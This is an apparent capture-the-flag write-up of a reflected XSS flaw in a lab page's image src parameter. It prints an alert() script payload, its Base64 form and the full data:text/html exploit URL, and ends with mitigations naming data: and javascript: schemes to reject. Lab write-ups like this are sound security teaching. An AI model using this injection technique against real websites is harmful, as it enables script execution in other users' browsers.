# 🖼️ Flag: NSA Image — Reflected XSS via Data URI Scheme

## Vulnerability Type
**Reflected XSS (Cross-Site Scripting)** — Data URI Injection

## Description

The landing page loads images through a PHP script using a `src` query parameter:

```
?page=media&src=nsa
```

The server takes the value of `src` and passes it directly to the browser without sanitizing it. This allows an attacker to inject a **Data URI** instead of a normal image path to force the browser to render arbitrary HTML/JavaScript.

## Exploit

### Step 1 — Craft the payload

```html
<script>alert("xss")</script>
```

### Step 2 — Encode it to Base64

```
PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=
```

### Step 3 — Inject it via the Data URI scheme

```
http://192.168.64.17/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=
```

The browser interprets the `data:` URI as an embedded HTML document, decodes the Base64 payload, and executes the JavaScript — triggering the flag.

## Data URI Anatomy

| Segment | Meaning |
|---------|---------|
| `data:` | Protocol — tells the browser the content is inline, not remote |
| `text/html` | MIME type — instructs the browser to render it as a full HTML page |
| `;base64` | Encoding — the following content is Base64-encoded |
| `PHNjcmlwdD5...` | Payload — the Base64-encoded `<script>alert("xss")</script>` |

## Chain of Events

1. The attacker crafts a URL with a `data:` URI as the `src` parameter.
2. The server blindly echoes the value back into the page.
3. The browser receives `data:text/html;base64,...`, treats it as an embedded webpage, decodes and **executes** the JavaScript.
4. The evaluation system detects script execution and reveals the flag.

## Mitigation

- **Validate the `src` parameter server-side**: only allow alphanumeric characters corresponding to known, existing files.
- **Explicitly reject dangerous URI schemes**: `data:`, `javascript:`, `vbscript:`.
- Implement a strict **Content Security Policy (CSP)** header that blocks inline scripts and `data:` URIs.
